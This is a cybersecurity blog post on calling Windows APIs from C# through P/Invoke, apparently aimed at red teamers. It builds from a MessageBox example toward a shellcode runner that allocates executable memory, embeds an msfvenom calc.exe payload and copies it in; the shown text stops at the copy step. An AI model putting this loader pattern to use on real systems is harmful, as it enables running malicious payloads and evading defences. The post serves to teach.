<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="WinAPI and P/Invoke in C#" /><meta name="author" content="crypt0ace" /><meta property="og:locale" content="en" /><meta name="description" content="In this blog we will discuss C# and how we can leverage WinAPI in it." /><meta property="og:description" content="In this blog we will discuss C# and how we can leverage WinAPI in it." /><link rel="canonical" href="https://crypt0ace.github.io/posts/WinAPI-and-PInvoke-in-CSharp/" /><meta property="og:url" content="https://crypt0ace.github.io/posts/WinAPI-and-PInvoke-in-CSharp/" /><meta property="og:site_name" content="Crypt0ace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-31T00:00:00+05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="WinAPI and P/Invoke in C#" /><meta name="twitter:site" content="@crypt0acee" /><meta name="twitter:creator" content="@crypt0ace" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"crypt0ace"},"dateModified":"2022-09-02T18:58:00+05:00","datePublished":"2022-08-31T00:00:00+05:00","description":"In this blog we will discuss C# and how we can leverage WinAPI in it.","headline":"WinAPI and P/Invoke in C#","mainEntityOfPage":{"@type":"WebPage","@id":"https://crypt0ace.github.io/posts/WinAPI-and-PInvoke-in-CSharp/"},"url":"https://crypt0ace.github.io/posts/WinAPI-and-PInvoke-in-CSharp/"}</script><title>WinAPI and P/Invoke in C# | Crypt0ace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Crypt0ace"><meta name="application-name" content="Crypt0ace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Crypt0ace</a></div><div class="site-subtitle font-italic">A Cybersecurity Blog by Ahmed Sher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/crypt0ace" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/crypt0acee" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ahmedsherfreelance','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/ahmed-sher-93234a206/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>WinAPI and P/Invoke in C#</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>WinAPI and P/Invoke in C#</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1661886000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 31, 2022 </em> </span> <span> Updated <em class="" data-ts="1662127080" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 2, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Ahmed Sher </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1640 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>C# can be a very useful language to start building your initial red team toolkit in. Understandably, it does not provide the covert-ness (not sure if thats an actual word) that we can use in languages like C or C++. But it has other aspects like in memory execution and with the increase in tools that use C# we have also seen some cool tactics that can be utilized to bypass detection and defenses in out red team engagements. <br /> This blog post will cover basics of using our managed code so we can run Windows API calls. But we should first know what managed and unmanaged code means.</p><h2 id="managed-and-unmanaged-code"><span class="mr-2">Managed and Unmanaged Code</span><a href="#managed-and-unmanaged-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>C# is a Object Oriented language that is based on the .NET Framework which is made by Microsoft. The syntax is quite easy to understand and learn. There are two general terms which you will hear:</p><ol><li>Unmanaged Code.<li>Managed Code.</ol><p>In case of unmanaged code, as Microsoft says, the programmer is in-charge or everything. Everything from memory management, garbage collection, exception handling and security considerations like protections from buffer overflow attacks is the headache of the programmer. It compiles directly into native language that the OS can run directly and also provides low level access to programmer. <br /> For managed code, the code managed by a CLR (Common Language Runtime) in the .NET Framework. The CLR takes the code and compiles into intermediate language known as IL. It is then compiled by the runtime and executed. It also provides automatic memory management, security protections, garbage collection and exception handling etc. For better understanding, take a look at this picture. <br /> <img data-src="/assets/img/WinAPI-PInvoke/managed-unmanaged-code.png" alt="Managed and Unmanaged Code" data-proofer-ignore> <br /> When using C#, sometimes we need to access the power of unmanaged code from our managed code. We can create a bridge between managed and unmanaged code of ours thanks to the functionality of interopability that the CLR provides. This interopability is made possible with the use of P/Invoke!</p><h2 id="pinvoke"><span class="mr-2">P/Invoke</span><a href="#pinvoke" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Platform Invoke or otherwise known as P/Invoke is what helps us use unsafe or unmanaged code from unmanaged libraries into our managed code. According to Microsoft, <em>P/Invoke is a technology that allows you to access structs, callbacks, and functions in unmanaged libraries from your managed code. Most of the P/Invoke API is contained in two namespaces: <code class="language-plaintext highlighter-rouge">System</code> and <code class="language-plaintext highlighter-rouge">System.Runtime.InteropServices</code>. Using these two namespaces give you the tools to describe how you want to communicate with the native component.</em></p><h2 id="using-winapi-to-call-a-messagebox"><span class="mr-2">Using WinAPI to call a MessageBox</span><a href="#using-winapi-to-call-a-messagebox" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s look at an example. We can take a unmanaged API call like <code class="language-plaintext highlighter-rouge">MessageBox</code> and see what sytax it uses. <br /> <img data-src="/assets/img/WinAPI-PInvoke/messagebox.png" alt="MessageBox Function" data-proofer-ignore> <br /> We can see some things dont make sense here. We dont have <code class="language-plaintext highlighter-rouge">HWND</code> or <code class="language-plaintext highlighter-rouge">LPCTSTR</code> in C# that we can use. For this we can convert the data types to something we are familiar in C#. A data type conversion chart is found <a href="https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d">here</a>. This post by <a href="https://twitter.com/matterpreter">Matt Hand</a> at SpecterOps is also pretty great at explaining the same things I’m rambling about. The chart mentioned in the blog is: <br /> <img data-src="/assets/img/WinAPI-PInvoke/WinAPI.png" alt="WinAPI Data Conversion" data-proofer-ignore> <br /> So if we take this in account we can have something similar to this</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">MessageBox</span><span class="p">(</span>
  <span class="n">IntPtr</span>    <span class="n">hWnd</span><span class="p">,</span>
  <span class="kt">string</span> <span class="n">lpText</span><span class="p">,</span>
  <span class="kt">string</span> <span class="n">lpCaption</span><span class="p">,</span>
  <span class="kt">uint</span>    <span class="n">uType</span>
<span class="p">);</span>
</pre></table></code></div></div><p>But how do we actually use it? We need to use the <code class="language-plaintext highlighter-rouge">DllImport</code> to import the DLL which has the unmanaged code for us to use. We can find what DLL we have to use form the Microsoft Docs about the <code class="language-plaintext highlighter-rouge">MessageBox</code> function. For us it is the <code class="language-plaintext highlighter-rouge">User32.dll</code>. We can import this DLL by using</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="nf">Dllimport</span><span class="p">(</span><span class="s">"user32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="nf">MessageBox</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hWnd</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpText</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpCaption</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">uType</span><span class="p">);</span>
</pre></table></code></div></div><p>In line 2 of the above code, we mention the <code class="language-plaintext highlighter-rouge">extern</code> or external code that we want to use (<code class="language-plaintext highlighter-rouge">MessageBox</code>) with the syntax that we converted earlier. Putting all this together we get:</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="c1">// First we use the two namespaces that Microsoft mentioned.</span>
<span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">demo</span>
<span class="p">{</span>
  <span class="k">class</span> <span class="nc">Program</span>
  <span class="p">{</span>
    <span class="c1">// Here we import our DLL that holds our `MessageBox` Function.</span>
    <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"user32.dll"</span><span class="p">)]</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">int</span> <span class="nf">MessageBox</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hWnd</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpText</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpCaption</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">uType</span><span class="p">);</span>

    <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="c1">// Now we can call it using our required parameters.</span>
      <span class="nf">MessageBox</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="s">"Hey there!"</span><span class="p">,</span> <span class="s">"Hello from P/Invoke!"</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>When we compile and run it: <br /> <img data-src="/assets/img/WinAPI-PInvoke/MessageBox-Executed.png" alt="MessageBox Executed" data-proofer-ignore> <br /> Voila! WinAPI accomplished!</p><h2 id="creating-a-shellcode-runner"><span class="mr-2">Creating a Shellcode Runner</span><a href="#creating-a-shellcode-runner" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now that we know how to pop a message box using WinAPI let’s discuss how we can use it to make a simple shellcode loader. Too fast? You are free to do some research and explore the WinAPI more and then follow along later. This post considers that you already have some understanding of C# and it’s syntax so I’m just going to dive in. <br /> As from before, we will need to know the imports we are making. For our simple shellcode runner, we need 3 APIs. <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> to allocate memory, <code class="language-plaintext highlighter-rouge">CreateThread</code> to, you guessed it, create a thread and <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code> to wait for the thread to exit. We can import them as:</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">flProtect</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="n">UInt32</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">param</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="k">ref</span> <span class="n">UInt32</span> <span class="n">lpThreadId</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">UInt32</span> <span class="nf">WaitForSingleObject</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hHandle</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwMilliseconds</span><span class="p">);</span>
</pre></table></code></div></div><p>The syntax is taken from the Microsoft Docs and is converted using the Data Conversion photo from <a href="https://twitter.com/matterpreter">Matt Hand</a>. <br /> Now before going into the Main method and start working in the shellcode, we need to create some enums. These enums will hold our data that will remain constant. In the first import <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> we can see two things, <code class="language-plaintext highlighter-rouge">flAllocationType</code> and <code class="language-plaintext highlighter-rouge">flProtect</code>. According to the Microsoft Docs of this function, the first is the memory allocation type and the other is the memory protection for the region of pages to be allocated. What we need is the memory allocation type to be <code class="language-plaintext highlighter-rouge">MEM_COMMIT</code> to commit the memory space and the protection to be <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code> so we can put our shellcode in and then execute it. So for these two we can create enums.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">public</span> <span class="k">enum</span> <span class="n">TYPE</span>
<span class="p">{</span>
  <span class="n">MEM_COMMIT</span> <span class="p">=</span> <span class="m">0x00001000</span>
<span class="p">}</span>

<span class="k">public</span> <span class="k">enum</span> <span class="n">PROTECTION</span>
<span class="p">{</span>
  <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">=</span> <span class="m">0x40</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Now on to our Main method. We can start by initializing a C# byte array of our payload. For simplicity, I will be using a simple <code class="language-plaintext highlighter-rouge">msfvenom</code> generated payload that pops calculator.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c1">// msfvenom -p windows/exec CMD=calc.exe -f csharp</span>
<span class="kt">byte</span><span class="p">[]</span> <span class="n">buf</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">193</span><span class="p">]</span> <span class="p">{</span>
      <span class="m">0xfc</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x82</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x60</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xe5</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span>
      <span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x0c</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x14</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x0f</span><span class="p">,</span><span class="m">0xb7</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x26</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span>
      <span class="m">0xac</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x02</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xcf</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc7</span><span class="p">,</span><span class="m">0xe2</span><span class="p">,</span><span class="m">0xf2</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span>
      <span class="m">0x57</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x10</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x11</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0xe3</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd1</span><span class="p">,</span>
      <span class="m">0x51</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x18</span><span class="p">,</span><span class="m">0xe3</span><span class="p">,</span><span class="m">0x3a</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span>
      <span class="m">0x01</span><span class="p">,</span><span class="m">0xd6</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xac</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xcf</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc7</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xf6</span><span class="p">,</span><span class="m">0x03</span><span class="p">,</span>
      <span class="m">0x7d</span><span class="p">,</span><span class="m">0xf8</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x7d</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xe4</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span>
      <span class="m">0x0c</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x1c</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x04</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span>
      <span class="m">0x24</span><span class="p">,</span><span class="m">0x5b</span><span class="p">,</span><span class="m">0x5b</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x12</span><span class="p">,</span><span class="m">0xeb</span><span class="p">,</span>
      <span class="m">0x8d</span><span class="p">,</span><span class="m">0x5d</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x8d</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xb2</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span>
      <span class="m">0x87</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0xb5</span><span class="p">,</span><span class="m">0xa2</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0xa6</span><span class="p">,</span><span class="m">0x95</span><span class="p">,</span><span class="m">0xbd</span><span class="p">,</span><span class="m">0x9d</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span>
      <span class="m">0x3c</span><span class="p">,</span><span class="m">0x06</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x0a</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0xfb</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x05</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0x47</span><span class="p">,</span><span class="m">0x13</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span>
      <span class="m">0x00</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x00</span> <span class="p">};</span>
</pre></table></code></div></div><p>As that is sorted now we can use our APIs to execute it. First we use <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> to allocate some memory for our shellcode. The address is going to be zero because we are just starting it, the size needs to be equal to the size of shellcode, aloocation needs to be <code class="language-plaintext highlighter-rouge">MEM_COMMIT</code>, and the protection should be <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code>. So this becomes:</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">shellcode_size</span> <span class="p">=</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
<span class="n">IntPtr</span> <span class="n">init</span> <span class="p">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="p">(</span><span class="n">UInt32</span><span class="p">)</span><span class="n">TYPE</span><span class="p">.</span><span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="p">(</span><span class="n">UInt32</span><span class="p">)</span><span class="n">PROTECTION</span><span class="p">.</span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
</pre></table></code></div></div><p>Now that the memory space is allocated we can use <code class="language-plaintext highlighter-rouge">Marshal.Copy</code> to put our shellcode in the place. It takes 4 arguments, The byte array of our shellcode, the starting index, the destination and the size.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Marshal</span><span class="p">.</span><span class="nf">Copy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">init</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>
